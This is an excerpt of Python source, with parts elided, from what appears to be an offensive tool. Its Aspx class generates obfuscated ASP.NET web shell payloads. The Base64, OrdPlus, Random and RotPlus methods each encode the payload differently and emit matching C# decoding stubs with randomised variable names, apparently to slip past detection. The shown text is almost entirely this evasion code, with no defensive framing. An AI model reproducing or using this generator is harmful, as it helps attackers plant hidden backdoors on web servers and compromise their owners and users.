...
class Aspx(Shell): 
	...
	def Base64(self, add_junk = False): 
		...
		payload += 'string ' + self.vars[5] + ' = Encoding.UTF8.GetString(Convert.FromBase64String(' + self.vars[1] + '.Replace(@"' + junk + '", ""))); \n' 
	...
	def OrdPlus(self, add_junk = False): 
		...
		payload += 'string ' + self.vars[4] + ' = ""; \n' 
		payload += ''.join([ self.vars[4] + ' += "' + vals[i] + '"; \n' for i in range(len(vals)) ]) 
		payload += 'foreach(string ' + self.vars[5] + ' in ' + self.vars[4] + '.Split(\'' + chr_join + '\')) { ' + self.vars[6] + ' += (char)(Convert.ToInt32(' + self.vars[5] + ') - ' + str(ord_plus) + '); } \n' 
	...
	def Random(self, add_junk = False): 
		...
		payload += 'string ' + self.vars[4] + ' = "' + cs1.encode('unicode-escape').replace('"', '\\"') + '"; \n' 
		payload += 'string ' + self.vars[6] + ' = "' + cs2.encode('unicode-escape').replace('"', '\\"') + '"; \n' 
		payload += 'string ' + self.vars[5] + ' = ""; \n' 
		payload += ''.join([ self.vars[5] + ' += "' + vals[i].encode('unicode-escape').replace('"', '\\"') + '"; \n' for i in range(len(vals)) ]) 
		payload += 'foreach(char c in ' + self.vars[5] + ') { ' + self.vars[7] + ' += ' + self.vars[6] + '.Contains(c.ToString()) ? ' + self.vars[4] + '[' + self.vars[6] + '.IndexOf(c)] : c; } \n' 
	...
	def RotPlus(self, add_junk = False): 
		...
		payload += 'string ' + self.vars[4] + ' = "" ; \n' 
		payload += ''.join([ self.vars[4] + ' += "' + vals[i].encode('unicode-escape').replace('"', '\\"') + '"; \n' for i in range(len(vals)) ]) 
		payload += 'for(int i = 0; i < ' + self.vars[4] + '.Length / ' + self.vars[5] + '; i++) { for(int r = 0; r < ' + self.vars[5] + '; r++) ' + self.vars[6] + '[r] += ' + self.vars[4] + '[r + i * ' + self.vars[5] + ']; } \n'
